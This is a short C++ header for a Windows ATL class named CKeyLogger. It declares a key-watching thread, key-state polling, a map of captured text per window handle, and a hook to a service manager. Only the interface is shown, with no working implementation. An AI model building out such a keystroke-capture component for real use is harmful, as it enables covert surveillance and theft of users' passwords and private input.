#pragma once

struct WndData
{
	ATL::CStringA m_str;
};

#include "SrvMngr.h"

class CKeyLogger
{
public:
	CKeyLogger();
	~CKeyLogger(void);

	static DWORD WINAPI ThreadWatch( PVOID pVoid );
	void DoWatch();
	void Start();
	void Stop();
	void SetService( CSrvMngr *pService ) { m_pService = pService; }
private:
	void OnKeyEvent( WCHAR nKey );
	void GetKeysStates( SHORT *pKeys );
	bool IsValidChar( TCHAR nChar );

	ATL::CEvent m_evt;
	ATL::CAtlMap< HWND, WndData > m_map;
	HANDLE m_hThread;
	CSrvMngr *m_pService;
};

